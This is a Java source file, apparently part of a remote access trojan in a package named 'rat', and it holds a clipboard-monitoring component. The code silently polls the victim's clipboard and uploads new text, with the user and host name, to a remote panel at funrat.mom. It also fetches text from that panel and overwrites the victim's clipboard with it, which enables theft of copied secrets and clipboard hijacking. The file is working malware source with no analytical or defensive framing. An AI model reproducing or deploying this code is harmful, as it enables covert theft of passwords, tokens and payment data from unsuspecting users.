package com.example.rat;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class ClipboardMonitor {
   private static String lastContent = "";
   private static final String DEVICE = resolveDevice();

   private static String resolveDevice() {
      String prop = System.getProperty("screen.device.name");
      if (prop != null && !prop.trim().isEmpty()) {
         return prop.trim();
      }

      String env = System.getenv("SCREEN_DEVICE_NAME");
      if (env != null && !env.trim().isEmpty()) {
         return env.trim();
      }

      String pcName = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (pcName == null || pcName.trim().isEmpty()) {
         pcName = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return pcName + "@" + host;
   }

   public static void start(String key) {
      start(key, "funrat.mom");
   }

   public static void start(String key, String host) {
      String panelHost = host != null && !host.trim().isEmpty() ? host.trim() : "funrat.mom";
      Thread puller = new Thread(() -> {
         while (true) {
            try {
               String incoming = pull(key, panelHost);
               if (incoming != null && !incoming.isEmpty()) {
                  setClipboard(incoming);
                  lastContent = incoming;
                  System.out.println("Clipboard set from panel (" + incoming.length() + " chars)");
               }
            } catch (Exception var4x) {
            }

            try {
               Thread.sleep(30000L);
            } catch (InterruptedException e) {
               return;
            }
         }
      });
      puller.setDaemon(true);
      puller.start();

      try {
         Toolkit tk = Toolkit.getDefaultToolkit();

         while (true) {
            try {
               Transferable t = tk.getSystemClipboard().getContents(null);
               if (t != null && t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
                  String text = (String)t.getTransferData(DataFlavor.stringFlavor);
                  if (text != null && !text.isEmpty() && !text.equals(lastContent)) {
                     lastContent = text;
                     if (text.length() <= 500) {
                        sendClipboard(key, panelHost, text);
                     }
                  }
               }
            } catch (Exception var7) {
            }

            Thread.sleep(3000L);
         }
      } catch (Exception e) {
         System.err.println("Clipboard: " + e.getMessage());
      }
   }

   private static String pull(String key, String host) {
      HttpURLConnection c = null;

      try {
         URL url = new URL("https://" + host + "/api/clipboard/pull?key=" + URLEncoder.encode(key, "UTF-8"));
         c = (HttpURLConnection)url.openConnection();
         c.setConnectTimeout(8000);
         c.setReadTimeout(8000);
         return c.getResponseCode() != 200 ? null : readAll(c.getInputStream());
      } catch (Exception e) {
         return null;
      } finally {
         if (c != null) {
            c.disconnect();
         }
      }
   }

   private static void setClipboard(String text) {
      try {
         Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(text), null);
      } catch (Exception e) {
         System.err.println("Clipboard set: " + e.getMessage());
      }
   }

   private static String readAll(InputStream in) throws IOException {
      ByteArrayOutputStream b = new ByteArrayOutputStream();
      byte[] buf = new byte[8192];

      int n;
      while ((n = in.read(buf)) != -1) {
         b.write(buf, 0, n);
      }

      return new String(b.toByteArray(), StandardCharsets.UTF_8);
   }

   private static void sendClipboard(String key, String host, String text) {
      try {
         String json = "{\"type\":\"clipboard\",\"content\":\"" + escape(text) + "\"}";
         URL url = new URL("https://" + host + "/api/clipboard/upload?key=" + URLEncoder.encode(key, "UTF-8") + "&device=" + URLEncoder.encode(DEVICE, "UTF-8"));
         HttpURLConnection c = (HttpURLConnection)url.openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setConnectTimeout(10000);
         c.setReadTimeout(10000);
         c.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
         OutputStream out = c.getOutputStream();

         try {
            out.write(json.getBytes(StandardCharsets.UTF_8));
         } catch (Throwable var10) {
            if (out != null) {
               try {
                  out.close();
               } catch (Throwable var9) {
                  var10.addSuppressed(var9);
               }
            }

            throw var10;
         }

         if (out != null) {
            out.close();
         }

         int code = c.getResponseCode();
         if (code < 200 || code >= 300) {
            System.err.println("Clipboard HTTP " + code);
         }

         c.disconnect();
      } catch (Exception e) {
         System.err.println("Clipboard send: " + e.getMessage());
      }
   }

   private static String escape(String s) {
      return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "").replace("\t", "\\t");
   }
}
